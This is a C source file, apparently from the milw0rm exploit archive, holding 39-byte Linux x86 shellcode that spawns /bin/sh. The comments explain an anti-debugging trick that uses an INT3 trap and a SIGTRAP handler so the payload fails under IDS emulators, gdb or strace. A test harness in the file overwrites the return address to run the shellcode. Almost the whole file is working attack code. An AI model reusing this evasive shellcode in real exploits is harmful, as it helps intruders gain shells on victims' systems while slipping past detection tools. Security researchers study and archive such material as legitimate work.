/*
 * (linux/x86) anti-debug trick (INT 3h trap) + execve("/bin/sh", ["/bin/sh", NULL], NULL) - 39 bytes
 *
 * The idea behind a shellcode w/ an anti-debugging trick embedded in it, is if for any reason the IDS
 * would try to x86-emulate the shellcode it would *glitch* and fail. This also protectes the shellcode
 * from running within a debugger environment such as gdb and strace.
 *
 * How this works? the shellcode registers for the SIGTRAP signal (aka. Breakpoint Interrupt) and use it
 * to call the acutal payload (e.g. _evil_code) while a greedy debugger or a confused x86-emu won't pass
 * the signal handler to the shellcode, it would end up doing _exit() instead execuve()
 *
 * - izik <izik@tty64.org>
 */

char shellcode[] =

	"\x6a\x30"              // push $0x30
	"\x58"                  // pop %eax
	"\x6a\x05"              // push $0x5
	"\x5b"                  // pop %ebx
	"\xeb\x05"              // jmp <_evil_code>

	//
 	// <_evilcode_loc>:
	//

	"\x59"                  // pop %ecx
	"\xcd\x80"              // int $0x80
	"\xcc"                  // int3
	"\x40"                  // inc %eax
	"\xe8\xf6\xff\xff\xff"  // call <_evilcode_loc>
	"\x99"                  // cltd

	//
        // <_evil_code>:
        //

	"\xb0\x0b"              // mov $0xb,%al
	"\x52"                  // push %edx
	"\x68\x2f\x2f\x73\x68"  // push $0x68732f2f
	"\x68\x2f\x62\x69\x6e"  // push $0x6e69622f
	"\x89\xe3"              // mov %esp,%ebx
	"\x52"                  // push %edx
	"\x53"                  // push %ebx
	"\x54"                  // push %esp
	"\xeb\xe1";             // jmp <_evilcode_loc>

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}

// milw0rm.com [2006-01-21]